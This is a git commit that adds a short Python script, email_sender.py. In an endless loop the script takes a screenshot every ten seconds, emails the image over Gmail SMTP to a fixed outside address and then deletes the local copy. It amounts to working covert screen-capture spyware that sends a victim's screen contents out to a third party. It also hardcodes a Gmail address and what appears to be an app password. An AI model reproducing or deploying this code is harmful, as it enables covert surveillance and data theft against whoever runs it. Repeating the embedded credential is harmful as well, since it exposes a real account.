b56bad237c432bc49f5779156f8439584d22022d
Abdulkarim Maslouk <90416002+Abdulkarim9@users.noreply.github.com>
2022-11-28 09:03:11 +0300

    Add files via upload

---
+++ email_sender.py
@@ -0,0 +1,65 @@
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
+import ssl
+import smtplib
+import pyautogui
+import os
+from pathlib import Path
+import time
+
+
+def take_screenshot():
+    global image_full_path
+    # Find path to home directory
+    home_dir = Path.home()
+    # Join home directory with folder name
+    path = os.path.join(home_dir, "Documents")
+    
+    # Take screenshot
+    screenshot = pyautogui.screenshot()
+    screenshot.save(path + '\\' + "screenshot.jpg")
+    image_full_path = path + '\\' + "screenshot.jpg"
+
+
+
+def send_email():
+           
+    email_sender = "abdulkarimmaslouk4@gmail.com"
+    email_password = "uzeikxfcxjejpxmu"
+    email_receiver = "musaadrar9@gmail.com"
+
+    subject = "Testing 2"
+    body = "Let me know what you think about this photo"
+
+    em = MIMEMultipart()
+    em['From'] = email_sender
+    em['To'] = email_receiver
+    em['subject'] = subject
+
+    em.attach(MIMEText(body, 'plain'))
+
+    file_location = image_full_path
+    file_name = os.path.basename(file_location)
+    attachment = open(file_location, "rb").read()
+
+    image = MIMEImage(attachment, file_name)
+    em.attach(image)
+   
+
+    context = ssl.create_default_context()
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+        smtp.login(email_sender, email_password)
+        smtp.sendmail(email_sender, email_receiver, em.as_string())
+
+
+
+while True:
+    time.sleep(10)
+    take_screenshot()
+    send_email()
+
+    os.remove(image_full_path)
+
+
